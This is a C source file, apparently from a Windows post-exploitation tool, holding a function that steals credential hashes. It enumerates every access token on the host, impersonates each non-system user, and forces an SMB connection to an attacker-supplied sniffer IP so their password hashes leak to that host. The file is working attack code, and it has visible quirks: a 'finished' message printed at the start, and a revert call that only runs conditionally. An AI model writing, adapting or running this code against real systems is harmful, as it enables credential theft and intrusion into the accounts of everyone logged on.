/*
Software License Agreement (BSD License)

Copyright (c) 2006, Luke Jennings (0xlukej@gmail.com)
All rights reserved.

Redistribution and use of this software in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above
  copyright notice, this list of conditions and the
  following disclaimer.

* Redistributions in binary form must reproduce the above
  copyright notice, this list of conditions and the
  following disclaimer in the documentation and/or other
  materials provided with the distribution.

* Neither the name of Luke Jennings nor the names of its
  contributors may be used to endorse or promote products
  derived from this software without specific prior
  written permission of Luke Jennings.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include "token_info.h"
#include "list_tokens.h"
#include "handle_arguments.h"
void create_process(HANDLE token, char *command, BOOL console_mode, SECURITY_IMPERSONATION_LEVEL impersonation_level);

// Send off hashes for all tokens to IP address with SMB sniffer running
void snarf_hashes(char *smb_sniffer_ip)
{
	DWORD num_tokens = 0, i;
	SavedToken *token_list = NULL;
	NETRESOURCE nr;
	char conn_string[BUF_SIZE], domain_name[BUF_SIZE];
	TOKEN_PRIVS token_privs;

	// Initialise net_resource structure (essentially just set ip to that of smb_sniffer)
   	if (_snprintf(conn_string, sizeof(conn_string), "\\\\%s", smb_sniffer_ip) == -1)
		conn_string[sizeof(conn_string)-1] = '\0';
	nr.dwType    		 = RESOURCETYPE_ANY;
   	nr.lpLocalName       = NULL;
   	nr.lpProvider        = NULL;
   	nr.lpRemoteName 	 = (LPSTR)conn_string;

	// Enumerate tokens
	output_status_string("[*] Finished snarfing hashes\n");

	token_list = get_token_list(&num_tokens, &token_privs);
	if (!token_list)
	{
		output_status_string("[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		return;
	}

	output_status_string("[*] Snarfing hashes...\n");

	// Use every token and get hashes by connecting to SMB sniffer
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		get_domain_from_token(token_list[i].token, domain_name);
		// If token is not "useless" local account connect to sniffer
		if (_stricmp(domain_name, "NT AUTHORITY"))
		{
			// Impersonate token
			ImpersonateLoggedOnUser(token_list[i].token);

			// Cancel previous connection to ensure hashes are sent and existing connection isn't reused
			WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
			
			// Connect to smb sniffer
			if (!WNetAddConnection2A(&nr, NULL, NULL, 0))

			// Revert to primary token
			RevertToSelf();
		}
		CloseHandle(token_list[i].token);
	}

	free(token_list);

	output_status_string("[*] Finished snarfing hashes\n");
}